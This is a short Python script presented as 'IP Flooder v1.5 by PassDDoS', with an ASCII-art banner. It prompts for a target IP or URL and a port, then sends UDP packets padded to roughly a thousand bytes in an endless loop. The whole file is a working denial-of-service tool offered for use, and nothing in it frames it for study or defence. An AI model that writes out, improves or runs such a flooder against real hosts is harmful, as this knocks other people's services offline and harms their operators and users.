#!/usr/bin/python
import socket ,os ,time ,random 
from sys import exit 
print ("""                       .                                 
                       M
                      dM
                      MMr
                     4MMML                  .
                     MMMMM.                xf
     .              "MMMMM               .MM-
      Mh..          +MMMMMM            .MMMM
      .MMM.         .MMMMML.          MMMMMh
       )MMMh.        MMMMMM         MMMMMMM
        3MMMMx.     'MMMMMMf      xnMMMMMM"
        '*MMMMM      MMMMMM.     nMMMMMMP"
          *MMMMMx    "MMMMM\    .MMMMMMM=
           *MMMMMh   "MMMMM"   JMMMMMMP
             MMMMMM   3MMMM.  dMMMMMM            .
              MMMMMM  "MMMM  .MMMMM(        .nnMP"
  =..          *MMMMx  MMM"  dMMMM"    .nnMMMMM*
    "MMn...     'MMMMr 'MM   MMM"   .nMMMMMMM*"
     "4MMMMnn..   *MMM  MM  MMP"  .dMMMMMMM""
       ^MMMMMMMMx.  *ML "M .M*  .MMMMMM**"
          *PMMMMMMhn. *x > M  .MMMM**""
             ""**MMMMhx/.h/ .=*"
                      .3P"%....
                    nP"     "*MMnx 
	    ----== IP Flooder v1.5 ==----
	   ----== C0d3d by PassDDoS ==----
""")

url =raw_input ("[*] Target [IP/URL]: ")

host = url.replace("http://", "").replace("https://", "").replace("http://www.", "").replace("https://www.", "").split('/')[0]
buff = raw_input("[+] Messenger: ")
port = input("[*] Port: ")
print("\n[!] IP Flooder v1.5 | " +str(host)+ ":" +str(port)+ " UDP Flooding...")

buff = time.ctime() + ": " + buff + " " * 1000

while True:
    try :

        s=socket .socket (socket .AF_INET ,socket .SOCK_DGRAM )

        s.connect ((host ,port ))

        s.send (buff )

        s.close ()

    except socket .error :

        s.close ()

        print ("[!] System Timeout")
